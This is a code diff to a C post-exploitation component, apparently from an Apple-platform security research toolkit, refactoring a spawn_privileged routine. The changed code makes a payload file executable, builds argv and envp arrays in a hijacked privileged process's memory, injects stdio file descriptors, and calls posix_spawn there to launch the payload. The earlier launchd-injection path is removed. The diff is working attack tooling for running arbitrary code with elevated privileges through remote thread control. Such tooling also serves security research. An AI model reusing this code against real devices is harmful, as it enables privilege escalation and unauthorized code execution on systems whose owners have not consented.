@@ -21,9 +21,9 @@ make_payload_executable(threadexec_t priv_tx, const char *path) {
 	return true;
 }
 
-// Build the argv and envp arrays in launchd.
+// Build the argv and envp arrays.
 static bool
-build_argv_in_launchd(threadexec_t launchd_tx, const char *path,
+build_argv_and_envp(threadexec_t priv_tx, const char *path,
 		const char **argv, const char **envp,
 		const void **path_r, const void **argv_r, const void **envp_r) {
 	// We will lay out the path/argv/envp entries like this:
@@ -56,7 +56,7 @@ build_argv_in_launchd(threadexec_t launchd_tx, const char *path,
 	// Get the default shared vm region.
 	uint8_t *memory_R;
 	uint8_t *memory_L;
-	threadexec_shared_vm_default(launchd_tx,
+	threadexec_shared_vm_default(priv_tx,
 			(const void **)&memory_R, (void **)&memory_L, NULL);
 	// Create pointers to argv, envp, path, and the strings array.
 	char **argv_L    = (void *)(memory_L);
@@ -94,7 +94,7 @@ build_argv_in_launchd(threadexec_t launchd_tx, const char *path,
 
 // Create file actions for posix_spawn() that will set up the stdin/stdout/stderr file descriptors.
 static bool
-setup_stdio_fds(threadexec_t launchd_tx, const int *stdio_fds,
+setup_stdio_fds(threadexec_t priv_tx, const int *stdio_fds,
 		int *stdio_fds_r, const void **file_actions_r) {
 	// Initialize stdio_fds_r to be all invalid.
 	for (size_t i = 0; i < 3; i++) {
@@ -108,11 +108,11 @@ setup_stdio_fds(threadexec_t launchd_tx, const int *stdio_fds,
 	// Grab memory for a posix_spawn_file_actions_t. This is an opaque type and all functions
 	// take a pointer to it.
 	uint8_t *memory_R;
-	threadexec_shared_vm_default(launchd_tx, (const void **)&memory_R, NULL, NULL);
+	threadexec_shared_vm_default(priv_tx, (const void **)&memory_R, NULL, NULL);
 	posix_spawn_file_actions_t *file_actions_R = (void *)(memory_R + 0x7000);
 	// Initialize the posix_spawn file actions.
 	int err;
-	bool ok = threadexec_call_cv(launchd_tx, &err, sizeof(err),
+	bool ok = threadexec_call_cv(priv_tx, &err, sizeof(err),
 			posix_spawn_file_actions_init, 1,
 			TX_CARG_LITERAL(posix_spawn_file_actions_t *, file_actions_R));
 	if (!ok || err != 0) {
@@ -126,16 +126,17 @@ setup_stdio_fds(threadexec_t launchd_tx, const int *stdio_fds,
 		if (stdio_fds[i] < 0) {
 			continue;
 		}
-		// First insert local file stdio_fds[i] into launchd.
+		// First insert local file stdio_fds[i] into priv_tx.
 		int fd_r;
-		ok = threadexec_file_insert(launchd_tx, stdio_fds[i], &fd_r);
+		ok = threadexec_file_insert(priv_tx, stdio_fds[i], &fd_r);
 		if (!ok) {
-			ERROR("Could not insert file descriptor %d into launchd", stdio_fds[i]);
+			ERROR("Could not insert file descriptor %d into target process",
+					stdio_fds[i]);
 			return false;
 		}
 		stdio_fds_r[i] = fd_r;
 		// Add a posix_spawn file action to duplicate fd_r to i.
-		ok = threadexec_call_cv(launchd_tx, &err, sizeof(err),
+		ok = threadexec_call_cv(priv_tx, &err, sizeof(err),
 				posix_spawn_file_actions_adddup2, 3,
 				TX_CARG_LITERAL(posix_spawn_file_actions_t *, file_actions_R),
 				TX_CARG_LITERAL(int, fd_r),
@@ -150,17 +151,19 @@ setup_stdio_fds(threadexec_t launchd_tx, const int *stdio_fds,
 
 // Destroy the file descriptors and file actions created with setup_stdio_fds().
 static void
-cleanup_stdio_fds(threadexec_t launchd_tx, int *stdio_fds_r, const void *file_actions_r) {
-	// Close the remote file descriptors.
-	for (size_t i = 0; i < 3; i++) {
-		if (stdio_fds_r[i] >= 0) {
-			threadexec_file_close(launchd_tx, stdio_fds_r[i]);
+cleanup_stdio_fds(threadexec_t priv_tx, int *stdio_fds_r, const void *file_actions_r) {
+	if (file_actions_r != NULL) {
+		// Close the remote file descriptors.
+		for (size_t i = 0; i < 3; i++) {
+			if (stdio_fds_r[i] >= 0) {
+				threadexec_file_close(priv_tx, stdio_fds_r[i]);
+			}
 		}
+		// Destroy the posix_spawn_file_actions_t.
+		threadexec_call_cv(priv_tx, NULL, 0,
+				posix_spawn_file_actions_destroy, 1,
+				TX_CARG_LITERAL(posix_spawn_file_actions_t *, file_actions_r));
 	}
-	// Destroy the posix_spawn_file_actions_t.
-	threadexec_call_cv(launchd_tx, NULL, 0,
-			posix_spawn_file_actions_destroy, 1,
-			TX_CARG_LITERAL(posix_spawn_file_actions_t *, file_actions_r));
 }
 
 pid_t
@@ -170,13 +173,6 @@ spawn_privileged(threadexec_t priv_tx, const char *path,
 	pid_t pid = -1;
 	// Chmod the payload so it is executable.
 	make_payload_executable(priv_tx, path);
-	// Create an execution context in launchd. We need launchd to be the parent process or the
-	// child will get killed.
-	threadexec_t launchd_tx = threadexec_init_with_threadexec_and_pid(priv_tx, 1);
-	if (launchd_tx == NULL) {
-		ERROR("Could not create execution context in launchd");
-		goto fail_0;
-	}
 	// Use default argv and envp arrays if none are specified.
 	const char *default_argv[] = { path, NULL };
 	const char *default_envp[] = { NULL };
@@ -186,27 +182,28 @@ spawn_privileged(threadexec_t priv_tx, const char *path,
 	if (envp == NULL) {
 		envp = default_envp;
 	}
-	// Build the argv and envp array in launchd. This uses the default shared memory so there's
+	// Build the argv and envp array in priv_tx. This uses the default shared memory so there's
 	// no need to clean up after.
 	const void *path_r;
 	const void *argv_r;
 	const void *envp_r;
-	bool ok = build_argv_in_launchd(launchd_tx, path, argv, envp, &path_r, &argv_r, &envp_r);
+	bool ok = build_argv_and_envp(priv_tx, path, argv, envp, &path_r, &argv_r, &envp_r);
 	if (!ok) {
-		goto fail_1;
+		goto fail_0;
 	}
 	// Handle the stdin/stdout/stderr file descriptors. Make sure to call cleanup_stdio_fds()
 	// if this fails!
 	int stdio_fds_r[3];
 	const void *file_actions_r;
-	ok = setup_stdio_fds(launchd_tx, stdio_fds, stdio_fds_r, &file_actions_r);
+	ok = setup_stdio_fds(priv_tx, stdio_fds, stdio_fds_r, &file_actions_r);
 	if (!ok) {
-		goto fail_2;
+		goto fail_1;
 	}
-	// Call posix_spawn() in launchd to spawn the payload.
+	// Call posix_spawn() in priv_tx to spawn the payload.
+	// NOTE: The payload must have the appropriate entitlements or it will be killed.
 	DEBUG_TRACE(1, "Spawning %s", path);
 	int err;
-	ok = threadexec_call_cv(launchd_tx, &err, sizeof(err),
+	ok = threadexec_call_cv(priv_tx, &err, sizeof(err),
 			posix_spawn, 6,
 			TX_CARG_PTR_LITERAL_OUT(pid_t *, &pid),
 			TX_CARG_LITERAL(const char *, path_r),
@@ -215,15 +212,13 @@ spawn_privileged(threadexec_t priv_tx, const char *path,
 			TX_CARG_LITERAL(void *, argv_r),
 			TX_CARG_LITERAL(void *, envp_r));
 	if (!ok || err != 0) {
-		ERROR("Could not spawn %s: error %d", path, err);
-		goto fail_2;
+		ERROR("Could not spawn %s: error %d: %s", path, err, strerror(err));
+		goto fail_1;
 	}
 	// Success!
 	DEBUG_TRACE(1, "Spawned %s as PID %d", path, pid);
-fail_2:
-	cleanup_stdio_fds(launchd_tx, stdio_fds_r, file_actions_r);
 fail_1:
-	threadexec_deinit(launchd_tx);
+	cleanup_stdio_fds(priv_tx, stdio_fds_r, file_actions_r);
 fail_0:
 	return pid;
 }
